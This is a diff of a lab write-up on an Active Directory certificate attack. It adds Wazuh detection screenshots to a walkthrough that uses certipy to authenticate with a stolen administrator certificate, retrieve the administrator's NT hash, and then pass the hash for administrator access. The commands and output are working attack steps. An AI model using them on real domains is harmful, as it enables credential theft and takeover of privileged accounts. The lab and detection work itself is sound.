@@ -151,7 +151,21 @@ File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save w
 [*] Wrote certificate and private key to 'administrator.pfx'
 ```
 
-the certificate is captured , now lets ask the dc for the hash/TGT with the cert we acquired :
+the certificate is captured , lets take a look at wazuh:
+
+1st. cert requested logs:
+
+<img width="2539" height="1272" alt="image" src="https://github.com/user-attachments/assets/2761ebeb-cdbb-43b1-9bcd-10e8636e3e17" />
+
+<img width="1282" height="1236" alt="image" src="https://github.com/user-attachments/assets/70378ad0-9202-43bd-b78c-a593f45536e2" />
+
+then the Cert Provided logs :
+
+<img width="2545" height="1315" alt="image" src="https://github.com/user-attachments/assets/28332218-6bef-48ff-8059-00ce60f7241c" />
+
+<img width="1219" height="1423" alt="image" src="https://github.com/user-attachments/assets/1d7b9df2-87f6-4230-8896-380b9717331c" />
+
+now lets ask the dc for the hash/TGT with the cert we acquired : 
 
 ```
 certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.29.244                                                                                       ΓöÇΓöÇ(Wed,Aug05)ΓöÇΓöÿ
@@ -168,6 +182,10 @@ File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will sav
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@xyz.com': aad3b435b51404eeaad3b435b51404ee:0aa71e2167b6136dd8e4b17ed9fd8f91
 ```
+
+<img width="2533" height="958" alt="image" src="https://github.com/user-attachments/assets/c3323559-431b-4744-955d-31e9093463be" />
+
+<img width="1258" height="1252" alt="image" src="https://github.com/user-attachments/assets/4271fb6b-1e8c-45b4-8990-e3ab4fa4f41b" />
 
 we have Secuessfully obtained the ntlm hash of the administrator now lets perform the Pass_The_hash attack so we can access the desctop of administrator:
 
@@ -186,3 +204,5 @@ xyz\administrator
 
 as we can see we now have access to the Administrator one of the most high privileged user 
 ```
+
+
